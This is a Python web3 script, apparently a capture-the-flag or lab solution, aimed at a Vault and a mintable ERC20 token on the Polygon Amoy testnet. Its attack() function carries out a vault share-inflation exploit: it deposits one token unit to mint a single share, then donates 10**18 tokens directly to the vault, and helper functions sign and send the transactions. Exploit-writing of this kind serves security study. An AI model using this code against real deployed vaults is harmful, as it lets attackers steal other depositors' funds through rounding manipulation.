import json
import os
import pprint

from solcx import compile_files, install_solc
from web3 import Web3
from web3.middleware import geth_poa_middleware

def get_abi(solname):
    print(install_solc(version="latest"))
    result_ = compile_files(
        [solname], output_values=["abi", "bin-runtime"], solc_version="0.8.26"
    )
    with open("abi.json", "wt", encoding="ascii") as f:
        json.dump(result_, f)


if not os.path.exists("abi.json"):
    get_abi("mintable.sol")

abi = json.load(open("abi.json", encoding="ascii"))
abi_mintable = abi["mintable.sol:MintableERC20"]["abi"]
abi_vault = abi["mintable.sol:Vault"]["abi"]

testnet_rpc = "https://rpc-amoy.polygon.technology/"
web3 = Web3(Web3.HTTPProvider(testnet_rpc))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

myaddr = "0x01e456edFD092cC4CfF396834511e11EDB8AcC01"
private_key = ""

contract_address = "0x730aDB7DaD7B04C6b30eB4D4b6870A3cf45C252E"
vault_contract = web3.eth.contract(address=contract_address, abi=abi_vault)
###pprint.pprint([x for x in dir(vault_contract.functions) if "__" not in x])
vault_owner = vault_contract.functions.owner().call()
token_address = vault_contract.functions.token().call()
print("My shares: ", vault_contract.functions.shares(myaddr).call())
print("Total shares: ", vault_contract.functions.totalShares().call())

mintable_contract = web3.eth.contract(address=token_address, abi=abi_mintable)
#pprint.pprint([x for x in dir(mintable_contract.functions) if "__" not in x])
token_supply = mintable_contract.functions.totalSupply().call()
print("Token SUpply: ", token_supply)
vault_owner_balance = mintable_contract.functions.balanceOf(vault_owner).call()
print(f"{vault_owner_balance=}")
vault_balance = mintable_contract.functions.balanceOf(contract_address).call()
print(f"{vault_balance=}")
print("diff = ", token_supply - vault_owner_balance)
my_balance = mintable_contract.functions.balanceOf(myaddr).call()
print(f"{my_balance=}")

def create_transaction(func):
    transaction = func.build_transaction({
        'from': myaddr,
        'nonce': web3.eth.get_transaction_count(myaddr),
    })

# Sign the transaction
    signed_txn = web3.eth.account.sign_transaction(transaction, private_key=private_key)
    
    # Send the transaction
    txn_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
    
    # Wait for the transaction to be mined
    txn_receipt = web3.eth.wait_for_transaction_receipt(txn_hash)
    
    print(f"Transaction successful with hash: {txn_hash.hex()}")

def approve(amount, who):
    func1 = mintable_contract.functions.approve(who, amount)
    create_transaction(func1)

def transfer(amount, who):
    func = mintable_contract.functions.transfer(who, amount)
    create_transaction(func)

def deposit(amount):
    func = vault_contract.functions.deposit(amount)
    create_transaction(func)

def withdraw(amount):
    func = vault_contract.functions.withdraw(amount)
    create_transaction(func)

print(f"{contract_address=}")
print(f"{token_address=}")
print(f"{vault_owner=}")

#approve(shares_amount, contract_address)
#deposit(shares_amount)
#withdraw(shares_amount)
#approve(shares_amount, myaddr)
#transfer(shares_amount, myaddr)

def attack():
    approve(1, contract_address)
    deposit(1)

    assert vault_contract.functions.totalShares().call() == 1

    approve(10**18, contract_address)
    transfer(10**18, contract_address)

    assert mintable_contract.functions.balanceOf(contract_address).call() >= 10**18


#withdraw(10**18 + 10**17 + 1)

#print(vault_contract.functions.totalShares().call())
#attack()

#print(vault_contract.functions.shares(myaddr).call())
#approve(10**17, contract_address)
#deposit(10**17)
#print(vault_contract.functions.shares(myaddr).call())
